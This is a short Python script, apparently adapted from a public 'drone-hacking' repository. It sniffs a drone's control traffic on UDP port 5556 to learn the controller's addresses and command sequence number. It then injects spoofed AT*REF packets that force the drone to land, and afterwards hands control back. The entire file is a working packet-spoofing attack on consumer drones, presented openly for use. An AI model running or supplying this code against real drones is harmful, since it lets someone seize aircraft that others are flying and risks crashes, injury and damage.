#!/usr/bin/env/

from scapy.all import *
from time import sleep
import re

# Global variables, from https://github.com/markszabo/drone-hacking/
# Filled in in function
srcMAC= ""
dstMAC= ""
srcIP = ""
dstIP = ""
seqNr = ""
interface = "wlan0"

# function fills in network info
def pkt_callback(pkt):
	global srcMAC, dstMAC, srcIP, dstIP, seqNr
	if Raw in pkt and 'AT*' in pkt[Raw].load and srcMAC == "":
		srcMAC= pkt[Ether].src
		dstMAC= pkt[Ether].dst
		srcIP = pkt[IP].src
		dstIP = pkt[IP].dst

		p = re.compile("=(\d+),")
		m = p.search(pkt[Raw].load)
		seqNr = int(m.group(1))

# Sniff for publisher data
sniff(iface=interface, prn=pkt_callback, filter="port 5556", count = 10)

# Sends back spoofed landing data
for i in range(1, 10):
	payload = "AT*REF=" + str(seqNr+1000000+i) + ",290717696\r"
	print payload
	spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
	sendp(spoofed_packet, iface=interface)
	sleep(0.3)

# Returns control to the drone
sleep(5)
payload = "AT*REF=1,290717696\r"
print payload
spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=5556, dport=5556) / payload
sendp(spoofed_packet, iface=interface)